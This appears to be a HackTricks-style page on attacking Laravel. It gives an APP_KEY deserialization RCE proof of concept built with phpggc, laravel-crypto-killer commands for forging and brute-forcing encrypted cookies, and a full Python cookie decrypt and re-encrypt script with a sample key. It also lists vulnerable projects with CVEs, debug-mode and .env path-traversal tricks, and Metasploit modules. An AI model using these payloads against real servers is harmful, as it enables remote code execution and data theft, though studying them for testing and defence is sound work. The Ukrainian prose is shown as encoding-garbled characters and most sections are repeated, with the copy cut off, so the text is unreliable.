# Laravel

{{#include ../../banners/hacktricks-training.md}}

### Laravel SQLInjection

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ü–µ —Ç—É—Ç: [https://stitcher.io/blog/unsafe-sql-functions-in-laravel](https://stitcher.io/blog/unsafe-sql-functions-in-laravel)

---

## APP_KEY & Encryption internals (Laravel \u003e=5.6)

Laravel –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î AES-256-CBC (–∞–±–æ GCM) –∑ HMAC —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –ø—ñ–¥ –∫–∞–ø–æ—Ç–æ–º (`Illuminate\\Encryption\\Encrypter`).
–°–∏—Ä–∏–π —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç, —è–∫–∏–π –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç **–Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –∫–ª—ñ—î–Ω—Ç—É**, —î **Base64 JSON –æ–±'—î–∫—Ç–∞** —è–∫:
```json
{
"iv"   : "Base64(random 16-byte IV)",
"value": "Base64(ciphertext)",
"mac"  : "HMAC_SHA256(iv||value, APP_KEY)",
"tag"  : ""                 // only used for AEAD ciphers (GCM)
}
```
`encrypt($value, $serialize=true)` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `serialize()` –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —Ç–µ–∫—Å—Ç, —Ç–æ–¥—ñ —è–∫
`decrypt($payload, $unserialize=true)` **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ `unserialize()`** —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è.
–û—Ç–∂–µ, **–±—É–¥—å-—è–∫–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, —è–∫–∏–π –∑–Ω–∞—î 32-–±–∞–π—Ç–æ–≤–∏–π —Å–µ–∫—Ä–µ—Ç `APP_KEY`, –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π PHP —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –æ–±'—î–∫—Ç —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE —á–µ—Ä–µ–∑ –º–∞–≥—ñ—á–Ω—ñ –º–µ—Ç–æ–¥–∏ (`__wakeup`, `__destruct`, ‚Ä¶)**.

–ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π PoC (—Ñ—Ä–µ–π–º–≤–æ—Ä–∫ ‚â•9.x):
```php
use Illuminate\Support\Facades\Crypt;

$chain = base64_decode('<phpggc-payload>'); // e.g. phpggc Laravel/RCE13 system id -b -f
$evil  = Crypt::encrypt($chain);            // JSON->Base64 cipher ready to paste
```
–í—Å—Ç–∞–≤—Ç–µ –æ—Ç—Ä–∏–º–∞–Ω–∏–π —Ä—è–¥–æ–∫ —É –±—É–¥—å-—è–∫–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π `decrypt()` sink (–ø–∞—Ä–∞–º–µ—Ç—Ä –º–∞—Ä—à—Ä—É—Ç—É, cookie, —Å–µ—Å—ñ—è —Ç–æ—â–æ).

---

## laravel-crypto-killer üß®
[laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer) –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å —ñ –¥–æ–¥–∞—î –∑—Ä—É—á–Ω–∏–π **bruteforce** —Ä–µ–∂–∏–º:
```bash
# Encrypt a phpggc chain with a known APP_KEY
laravel_crypto_killer.py encrypt -k "base64:<APP_KEY>" -v "$(phpggc Laravel/RCE13 system id -b -f)"

# Decrypt a captured cookie / token
laravel_crypto_killer.py decrypt -k <APP_KEY> -v <cipher>

# Try a word-list of keys against a token (offline)
laravel_crypto_killer.py bruteforce -v <cipher> -kf appkeys.txt
```
–°–∫—Ä–∏–ø—Ç –ø—Ä–æ–∑–æ—Ä–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î —è–∫ CBC, —Ç–∞–∫ —ñ GCM –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≥–µ–Ω–µ—Ä—É—î –ø–æ–ª–µ HMAC/tag.

---

## –í—Ä–∞–∑–ª–∏–≤—ñ –ø–∞—Ç–µ—Ä–Ω–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —Å–≤—ñ—Ç—ñ

| –ü—Ä–æ–µ–∫—Ç | –í—Ä–∞–∑–ª–∏–≤–∏–π sink | –õ–∞–Ω—Ü—é–≥ –≥–∞–¥–∂–µ—Ç—ñ–≤ |
|---------|-----------------|--------------|
| Invoice Ninja ‚â§v5 (CVE-2024-55555) | `/route/{hash}` ‚Üí `decrypt($hash)` | Laravel/RCE13 |
| Snipe-IT ‚â§v6 (CVE-2024-48987) | cookie `XSRF-TOKEN`, –∫–æ–ª–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ `Passport::withCookieSerialization()` | Laravel/RCE9 |
| Crater  (CVE-2024-55556) | `SESSION_DRIVER=cookie` ‚Üí cookie `laravel_session` | Laravel/RCE15 |

–ü—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∑–∞–≤–∂–¥–∏ —Ç–∞–∫–∏–π:
1. –û—Ç—Ä–∏–º–∞—Ç–∏ `APP_KEY` (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –≤–∏—Ç—ñ–∫ Git, –≤–∏—Ç—ñ–∫ config/.env –∞–±–æ –±—Ä—É—Ç—Ñ–æ—Ä—Å)
2. –ó–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –≥–∞–¥–∂–µ—Ç –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **PHPGGC**
3. `laravel_crypto_killer.py encrypt ‚Ä¶`
4. –î–æ—Å—Ç–∞–≤–∏—Ç–∏ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä/cookie ‚Üí **RCE**

---

## –ú–∞—Å–æ–≤–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è APP_KEY —á–µ—Ä–µ–∑ –±—Ä—É—Ç—Ñ–æ—Ä—Å cookie

–û—Å–∫—ñ–ª—å–∫–∏ –∫–æ–∂–µ–Ω –Ω–æ–≤–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥—å Laravel –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –ø—Ä–∏–Ω–∞–π–º–Ω—ñ 1 –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π cookie (`XSRF-TOKEN` —ñ –∑–∞–∑–≤–∏—á–∞–π `laravel_session`), **–ø—É–±–ª—ñ—á–Ω—ñ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–∫–∞–Ω–µ—Ä–∏ (Shodan, Censys, ‚Ä¶) –≤–∏—Ç—ñ–∫–∞—é—Ç—å –º—ñ–ª—å–π–æ–Ω–∏ —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç—ñ–≤**, —è–∫—ñ –º–æ–∂–Ω–∞ –∞—Ç–∞–∫—É–≤–∞—Ç–∏ –æ—Ñ–ª–∞–π–Ω.

–ö–ª—é—á–æ–≤—ñ –≤–∏—Å–Ω–æ–≤–∫–∏ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è, –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–æ–≥–æ Synacktiv (2024-2025):
* –ù–∞–±—ñ—Ä –¥–∞–Ω–∏—Ö –ª–∏–ø–µ–Ω—å 2024 ¬ª 580 —Ç–∏—Å. —Ç–æ–∫–µ–Ω—ñ–≤, **3.99 % –∫–ª—é—á—ñ–≤ –∑–ª–∞–º–∞–Ω–æ** (‚âà23 —Ç–∏—Å.)
* –ù–∞–±—ñ—Ä –¥–∞–Ω–∏—Ö —Ç—Ä–∞–≤–µ–Ω—å 2025 ¬ª 625 —Ç–∏—Å. —Ç–æ–∫–µ–Ω—ñ–≤, **3.56 % –∫–ª—é—á—ñ–≤ –∑–ª–∞–º–∞–Ω–æ**
* >1 000 —Å–µ—Ä–≤–µ—Ä—ñ–≤ –≤—Å–µ —â–µ –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ —Å—Ç–∞—Ä–æ–≥–æ CVE-2018-15133, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–æ–∫–µ–Ω–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –º—ñ—Å—Ç—è—Ç—å —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –¥–∞–Ω—ñ.
* –í–µ–ª–∏–∫–µ –ø–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–ª—é—á—ñ–≤ ‚Äì –¢–æ–ø-10 APP_KEYs —î –∂–æ—Ä—Å—Ç–∫–æ –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —è–∫—ñ –ø–æ—Å—Ç–∞—á–∞—é—Ç—å—Å—è –∑ –∫–æ–º–µ—Ä—Ü—ñ–π–Ω–∏–º–∏ —à–∞–±–ª–æ–Ω–∞–º–∏ Laravel (UltimatePOS, Invoice Ninja, XPanel, ‚Ä¶).

–ü—Ä–∏–≤–∞—Ç–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Go **nounours** –ø—ñ–¥–≤–∏—â—É—î –ø—Ä–æ–ø—É—Å–∫–Ω—É –∑–¥–∞—Ç–Ω—ñ—Å—Ç—å –±—Ä—É—Ç—Ñ–æ—Ä—Å—É AES-CBC/GCM –¥–æ ~1.5 –º—ñ–ª—å—è—Ä–¥–∞ —Å–ø—Ä–æ–±/—Å, –∑–º–µ–Ω—à—É—é—á–∏ —á–∞—Å –∑–ª–∞–º—É –ø–æ–≤–Ω–æ–≥–æ –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö –¥–æ <2 —Ö–≤–∏–ª–∏–Ω.

---

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è
* [Laravel: APP_KEY leakage analysis](https://www.synacktiv.com/publications/laravel-appkey-leakage-analysis.html)
* [laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
* [PHPGGC ‚Äì PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
* [CVE-2018-15133 write-up (WithSecure)](https://labs.withsecure.com/archive/laravel-cookie-forgery-decryption-and-rce)

## –õ–∞—Ä–µ–≤–µ–ª –¢—Ä—é–∫–∏

### –†–µ–∂–∏–º –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è

–Ø–∫—â–æ Laravel —É **—Ä–µ–∂–∏–º—ñ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–∫–æ–¥—É** —Ç–∞ **—á—É—Ç–ª–∏–≤–∏—Ö –¥–∞–Ω–∏—Ö**.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥ `http://127.0.0.1:8000/profiles`:

![](<../../images/image (1046).png>)

–¶–µ –∑–∞–∑–≤–∏—á–∞–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —ñ–Ω—à–∏—Ö CVE RCE Laravel.

### .env

Laravel –∑–±–µ—Ä—ñ–≥–∞—î APP, —è–∫–∏–π –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è cookie —Ç–∞ —ñ–Ω—à–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, —É —Ñ–∞–π–ª—ñ –ø—ñ–¥ –Ω–∞–∑–≤–æ—é `.env`, –¥–æ —è–∫–æ–≥–æ –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥–µ—è–∫–æ–≥–æ –æ–±—Ö–æ–¥—É —à–ª—è—Ö—É: `/../.env`

Laravel —Ç–∞–∫–æ–∂ –ø–æ–∫–∞–∂–µ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è (—è–∫–∞ –∑'—è–≤–ª—è—î—Ç—å—Å—è, –∫–æ–ª–∏ Laravel –∑–Ω–∞—Ö–æ–¥–∏—Ç—å –ø–æ–º–∏–ª–∫—É —ñ –≤–æ–Ω–∞ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∞).

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π APP_KEY Laravel, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ –∑–∞—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ cookie:

### –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ cookie
```python
import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

#https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

def mcrypt_decrypt(value, iv):
global key
AES.key_size = [len(key)]
crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
global key
AES.key_size = [len(key)]
crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
return crypt_object.encrypt(value)


def decrypt(bstring):
global key
dic = json.loads(base64.b64decode(bstring).decode())
mac = dic['mac']
value = bytes(dic['value'], 'utf-8')
iv = bytes(dic['iv'], 'utf-8')
if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
#return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
return ''


def encrypt(string):
global key
iv = os.urandom(16)
#string = dumps(string)
padding = 16 - len(string) % 16
string += bytes(chr(padding) * padding, 'utf-8')
value = base64.b64encode(mcrypt_encrypt(string, iv))
iv = base64.b64encode(iv)
mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))

app_key ='HyfSfw6tOF92gKtVaLaLO4053ArgEf7Ze0ndz0v487k='
key = base64.b64decode(app_key)
decrypt('eyJpdiI6ImJ3TzlNRjV6bXFyVjJTdWZhK3JRZ1E9PSIsInZhbHVlIjoiQ3kxVDIwWkRFOE1sXC9iUUxjQ2IxSGx1V3MwS1BBXC9KUUVrTklReit0V2k3TkMxWXZJUE02cFZEeERLQU1PV1gxVForYkd1dWNhY3lpb2Nmb0J6YlNZR28rVmk1QUVJS3YwS3doTXVHSlhcL1JGY0t6YzhaaGNHR1duSktIdjF1elwvNXhrd1Q4SVlXMzBrbTV0MWk5MXFkSmQrMDJMK2F4cFRkV0xlQ0REVU1RTW5TNVMrNXRybW9rdFB4VitTcGQ0QlVlR3Vwam1IdERmaDRiMjBQS05VXC90SzhDMUVLbjdmdkUyMnQyUGtadDJHSEIyQm95SVQxQzdWXC9JNWZKXC9VZHI4Sll4Y3ErVjdLbXplTW4yK25pTGxMUEtpZVRIR090RlF0SHVkM0VaWU8yODhtaTRXcVErdUlhYzh4OXNacXJrVytqd1hjQ3FMaDhWeG5NMXFxVXB1b2V2QVFIeFwvakRsd1pUY0h6UUR6Q0UrcktDa3lFOENIeFR0bXIrbWxOM1FJaVpsTWZkSCtFcmd3aXVMZVRKYXl0RXN3cG5EMitnanJyV0xkU0E3SEUrbU0rUjlENU9YMFE0eTRhUzAyeEJwUTFsU1JvQ3d3UnIyaEJiOHA1Wmw1dz09IiwibWFjIjoiNmMzODEzZTk4MGRhZWVhMmFhMDI4MWQzMmRkNjgwNTVkMzUxMmY1NGVmZWUzOWU4ZTJhNjBiMGI5Mjg2NzVlNSJ9')
#b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"vYzY0IdalD2ZC7v9yopWlnnYnCB2NkCXPbzfQ3MV\\";s:8:\\"username\\";s:8:\\"guestc32\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605140631}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'
encrypt(b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"RYB6adMfWWTSNXaDfEw74ADcfMGIFC2SwepVOiUw\\";s:8:\\"username\\";s:8:\\"guest60e\\";s:5:\\"order\\";s:8:\\"lolololo\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605141157}')
```
### Laravel Deserialization RCE

–í—Ä–∞–∑–ª–∏–≤—ñ –≤–µ—Ä—Å—ñ—ó: 5.5.40 —Ç–∞ 5.6.x –¥–æ 5.6.29 ([https://www.cvedetails.com/cve/CVE-2018-15133/](https://www.cvedetails.com/cve/CVE-2018-15133/))

–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó: [https://labs.withsecure.com/archive/laravel-cookie-forgery-decryption-and-rce/](https://labs.withsecure.com/archive/laravel-cookie-forgery-decryption-and-rce/)

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [https://github.com/kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)\
–ê–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ –∑ metasploit: `use unix/http/laravel_token_unserialize_exec`

### CVE-2021-3129

–©–µ –æ–¥–Ω–∞ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è: [https://github.com/ambionics/laravel-exploits](https://github.com/ambionics/laravel-exploits)

### Laravel SQLInjection

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ü–µ —Ç—É—Ç: [https://stitcher.io/blog/unsafe-sql-functions-in-laravel](https://stitcher.io/blog/unsafe-sql-functions-in-laravel)


### Laravel SQLInjection

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ü–µ —Ç—É—Ç: [https://stitcher.io/blog/unsafe-sql-functions-in-laravel](https://stitcher.io/blog/unsafe-sql-functions-in-laravel)

---

## APP_KEY & Encryption internals (Laravel \u003e=5.6)

Laravel –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î AES-256-CBC (–∞–±–æ GCM) –∑ HMAC —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –ø—ñ–¥ –∫–∞–ø–æ—Ç–æ–º (`Illuminate\\Encryption\\Encrypter`).
–°–∏—Ä—Ü–µ–≤–∏–π —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç, —è–∫–∏–π –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç **–Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –∫–ª—ñ—î–Ω—Ç—É**, —î **Base64 JSON –æ–±'—î–∫—Ç–∞** —è–∫:
```json
{
"iv"   : "Base64(random 16-byte IV)",
"value": "Base64(ciphertext)",
"mac"  : "HMAC_SHA256(iv||value, APP_KEY)",
"tag"  : ""                 // only used for AEAD ciphers (GCM)
}
```
`encrypt($value, $serialize=true)` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `serialize()` –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —Ç–µ–∫—Å—Ç, —Ç–æ–¥—ñ —è–∫
`decrypt($payload, $unserialize=true)` **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ `unserialize()`** —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è.
–û—Ç–∂–µ, **–±—É–¥—å-—è–∫–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, —è–∫–∏–π –∑–Ω–∞—î 32-–±–∞–π—Ç–æ–≤–∏–π —Å–µ–∫—Ä–µ—Ç `APP_KEY`, –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π PHP —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –æ–±'—î–∫—Ç —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE —á–µ—Ä–µ–∑ –º–∞–≥—ñ—á–Ω—ñ –º–µ—Ç–æ–¥–∏ (`__wakeup`, `__destruct`, ‚Ä¶)**.

–ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π PoC (—Ñ—Ä–µ–π–º–≤–æ—Ä–∫ ‚â•9.x):
```php
use Illuminate\Support\Facades\Crypt;

$chain = base64_decode('<phpggc-payload>'); // e.g. phpggc Laravel/RCE13 system id -b -f
$evil  = Crypt::encrypt($chain);            // JSON->Base64 cipher ready to paste
```
–í—Å—Ç–∞–≤—Ç–µ –æ—Ç—Ä–∏–º–∞–Ω–∏–π —Ä—è–¥–æ–∫ —É –±—É–¥—å-—è–∫–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π `decrypt()` sink (–ø–∞—Ä–∞–º–µ—Ç—Ä –º–∞—Ä—à—Ä—É—Ç—É, cookie, —Å–µ—Å—ñ—è —Ç–æ—â–æ).

---

## laravel-crypto-killer üß®
[laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer) –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å —ñ –¥–æ–¥–∞—î –∑—Ä—É—á–Ω–∏–π —Ä–µ–∂–∏–º **bruteforce**:
```bash
# Encrypt a phpggc chain with a known APP_KEY
laravel_crypto_killer.py encrypt -k "base64:<APP_KEY>" -v "$(phpggc Laravel/RCE13 system id -b -f)"

# Decrypt a captured cookie / token
laravel_crypto_killer.py decrypt -k <APP_KEY> -v <cipher>

# Try a word-list of keys against a token (offline)
laravel_crypto_killer.py bruteforce -v <cipher> -kf appkeys.txt
```
–°–∫—Ä–∏–ø—Ç –ø—Ä–æ–∑–æ—Ä–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î —è–∫ CBC, —Ç–∞–∫ —ñ GCM –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≥–µ–Ω–µ—Ä—É—î –ø–æ–ª–µ HMAC/tag.

---

## –í—Ä–∞–∑–ª–∏–≤—ñ –ø–∞—Ç–µ—Ä–Ω–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —Å–≤—ñ—Ç—ñ

| –ü—Ä–æ–µ–∫—Ç | –í—Ä–∞–∑–ª–∏–≤–∏–π sink | –õ–∞–Ω—Ü—é–≥ –≥–∞–¥–∂–µ—Ç—ñ–≤ |
|---------|-----------------|--------------|
| Invoice Ninja ‚â§v5 (CVE-2024-55555) | `/route/{hash}` ‚Üí `decrypt($hash)` | Laravel/RCE13 |
| Snipe-IT ‚â§v6 (CVE-2024-48987) | cookie `XSRF-TOKEN`, –∫–æ–ª–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–æ `Passport::withCookieSerialization()` | Laravel/RCE9 |
| Crater  (CVE-2024-55556) | `SESSION_DRIVER=cookie` ‚Üí cookie `laravel_session` | Laravel/RCE15 |

–ü—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∑–∞–≤–∂–¥–∏:
1. –û—Ç—Ä–∏–º–∞—Ç–∏ `APP_KEY` (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –≤–∏—Ç—ñ–∫ –∑ Git, –≤–∏—Ç—ñ–∫ config/.env –∞–±–æ –±—Ä—É—Ç—Ñ–æ—Ä—Å)
2. –ó–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –≥–∞–¥–∂–µ—Ç –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **PHPGGC**
3. `laravel_crypto_killer.py encrypt ‚Ä¶`
4. –î–æ—Å—Ç–∞–≤–∏—Ç–∏ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä/cookie ‚Üí **RCE**

---

## –ú–∞—Å–æ–≤–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è APP_KEY —á–µ—Ä–µ–∑ –±—Ä—É—Ç—Ñ–æ—Ä—Å cookie

–û—Å–∫—ñ–ª—å–∫–∏ –∫–æ–∂–µ–Ω –Ω–æ–≤–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥—å Laravel –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –ø—Ä–∏–Ω–∞–π–º–Ω—ñ 1 –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π cookie (`XSRF-TOKEN` —ñ –∑–∞–∑–≤–∏—á–∞–π `laravel_session`), **–ø—É–±–ª—ñ—á–Ω—ñ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–∫–∞–Ω–µ—Ä–∏ (Shodan, Censys, ‚Ä¶) –≤–∏—Ç—ñ–∫–∞—é—Ç—å –º—ñ–ª—å–π–æ–Ω–∏ —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç—ñ–≤**, —è–∫—ñ –º–æ–∂–Ω–∞ –∞—Ç–∞–∫—É–≤–∞—Ç–∏ –æ—Ñ–ª–∞–π–Ω.

–ö–ª—é—á–æ–≤—ñ –≤–∏—Å–Ω–æ–≤–∫–∏ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è, –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–æ–≥–æ Synacktiv (2024-2025):
* –ù–∞–±—ñ—Ä –¥–∞–Ω–∏—Ö –ª–∏–ø–µ–Ω—å 2024 ¬ª 580 —Ç–∏—Å. —Ç–æ–∫–µ–Ω—ñ–≤, **3.99 % –∫–ª—é—á—ñ–≤ –∑–ª–∞–º–∞–Ω–æ** (‚âà23 —Ç–∏—Å.)
* –ù–∞–±—ñ—Ä –¥–∞–Ω–∏—Ö —Ç—Ä–∞–≤–µ–Ω—å 2025 ¬ª 625 —Ç–∏—Å. —Ç–æ–∫–µ–Ω—ñ–≤, **3.56 % –∫–ª—é—á—ñ–≤ –∑–ª–∞–º–∞–Ω–æ**
